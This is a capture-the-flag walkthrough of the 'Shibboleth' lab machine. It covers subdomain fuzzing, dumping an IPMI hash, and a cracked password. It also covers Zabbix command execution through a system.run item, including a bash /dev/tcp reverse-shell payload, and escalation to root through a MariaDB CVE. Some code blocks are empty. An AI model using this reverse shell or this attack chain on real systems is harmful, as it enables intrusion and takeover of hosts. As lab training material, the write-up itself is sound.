# Shibboleth

First as usual, `nmap`.

```

```

Going to the IP just redirects us to `shibboleth.htb` so we add that to `/etc/hosts`. We can then fuzz for virtual hosting.

```sh
$ ffuf -u 'http://shibboleth.htb/' -H "Host: FUZZ.shibboleth.htb" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fc 302

zabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 311ms]
```

We have 3 subdomains we can add to `/etc/hosts`. Visiting the 3, however, just give us the same page for logging into Zabbix. Trying to log in without valid credentials just give us the same generic message regardless of whether or not the username is valid so we can't enumerate usernames.

Exploring `http://shibboleth.htb/`, it seems to be the sample [FlexStart](https://bootstrapmade.com/flexstart-bootstrap-startup-template/) page. We have a blog post at `/blog-single.html` where we can find multiple user names which we might be able to use later. Also, on the home page, we find that we have a seemingly working contact form. However, in trying to send a message, while a request is made to `/forms/contact.php`, we just get a response of `Unable to load the "PHP Email Form" Library!`.

I then ran `gobuster`.

```sh
$ gobuster dir -u 'http://shibboleth.htb/' -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html -r

Looking at the Zabbix login page, the "Help" button points to [version 5.0](https://www.zabbix.com/documentation/5.0/) so we know the version of Zabbix we're working with. I tried looking for an exploit with `searchsploit` and in metasploit but found no usable exploit.

I then did a UDP scan of the target.

```

```

We have port 623 - [IPMI](https://book.hacktricks.xyz/pentesting/623-udp-ipmi). Using metasploit and its `auxiliary/scanner/ipmi/ipmi_dumphashes` module, we can dump the hash for `Administrator`.

```
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.231.204
rhosts => 10.129.231.204

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.231.204:623 - IPMI - Hash found: Administrator:94054d7a020600003a0810d9099ddf75380d4f8589fed5a31b714c8cb2fbf7725a16d57c7748b07ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:67ae7415d7385611c4c3ef582b6d910873f43fe4
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Cracking the hash gives us the password `ilovepumkinpie1`. With that, we can log in to `http://zabbix.shibboleth.htb/` as Administrator.

We can create an item to execute arbitrary code. First, go to "Configurations" and then "Hosts". In that page, click on "Items".

![](config_hosts.png)

After that, click on "Create item".

![](items.png)

When creating the item, set the "Key" to be `system.run[cmd]`, replacing `cmd` with the command to be run. After the initial creation, we can edit the item and execute code by clicking "Test" to run on click. I used the following payload to get a reverse shell (`setsid` to negate the timeout that would kill the shell after a few seconds).

```
system.run[setsid bash -c 'exec bash -i &>/dev/tcp/LHOST/LPORT <&1']
```

We should then have a reverse shell as `zabbix`. The only non-root user with a shell is `ipmi-svc` so we target that account. We can easily `su ipmi-svc` using the previous password `ilovepumkinpie1`.

Checking our privileges as `ipmi-svc`...

```sh
ipmi-svc@shibboleth:/tmp$ sudo -l
[sudo] password for ipmi-svc:
Sorry, user ipmi-svc may not run sudo on shibboleth.
```

We can't use `sudo`. Looking in `/etc/zabbix`, we have `zabbix_server.conf` which contains credentials for the user `zabbix` in `mysql`, so we can log into `mysql`. Checking `ps aux`, we see that `mysqld` is being run as `root`.

```sh
ipmi-svc@shibboleth:~$ ps aux | grep mysql
root        1435  0.7  3.7 1729672 151676 ?      Sl   Nov14   9:15 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock
[snip]
```

Looking at the mysql version ...

```sh
ipmi-svc@shibboleth:~$ mysql -V
mysql  Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
ipmi-svc@shibboleth:~$ mysqld -V
mysqld  Ver 10.3.25-MariaDB-0ubuntu0.20.04.1 for debian-linux-gnu on x86_64 (Ubuntu 20.04)
```

We see that we're working with MariaDB 10.3.25. We can search for Mariadb vulns.

```sh
$ searchsploit mariadb
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path

```

This exploit of CVE-2021-27928 should work according to its descriptions. Following the exploit, I created the payload, uploaded it to the machine, and got a root shell.
